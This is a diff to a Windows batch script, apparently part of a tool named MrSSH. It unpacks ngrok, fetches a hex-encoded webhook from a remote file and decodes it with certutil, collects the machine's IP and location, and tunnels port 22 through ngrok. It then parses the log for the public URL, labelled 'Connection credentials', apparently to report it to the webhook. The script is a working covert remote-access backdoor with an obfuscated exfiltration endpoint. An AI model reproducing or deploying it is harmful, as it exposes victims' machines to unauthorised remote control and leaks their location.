@@ -1,5 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
+chcp 65001 >nul
 set "LogFile=%temp%\Files\log\ngrok.log"
 set "EmbedText=Connection credentials"
 
@@ -7,15 +8,14 @@ mkdir %temp%\Files\log
 tar -xf ngrok.zip
 
 :: <Set webhook>
+set "Token=%~1"
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/v.1.0/Identifiers/Redirect.ini" -o "Redirect.ini"
-FOR /F "delims=" %%F IN (tokenName.txt) DO SET token=%%F
-FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
+FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "!Token!" "redirect.ini"`) DO (SET hexwebhook=%%F)
 set "hexwebhook=%hexwebhook:~-244%"
 echo !hexwebhook!>HexString.hex
 certutil -decodehex HexString.hex output.hex >nul
-set /p PlainString=<output.hex
+set /p webhook=<output.hex
 del HexString.hex output.hex
-set webhook=!PlainString!
 :: </Set webhook>
 
 for /f "delims=" %%a in ('call "WebParse.exe" "http://ip-api.com/json?fields=192511" query') do set "%%a"
@@ -32,7 +32,7 @@ start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log
         goto check
     goto done
     :done
-        xcopy /h /Y ngrok.log !Folder!\log\
+        xcopy /h /Y ngrok.log %temp%\Files\log\
 
         for /f "delims=" %%a in (!LogFile!) do echo %%a | findstr /c:"url=" >nul && set "Result=%%a"
         for /f "tokens=8 delims==" %%a in ("!Result!") do (
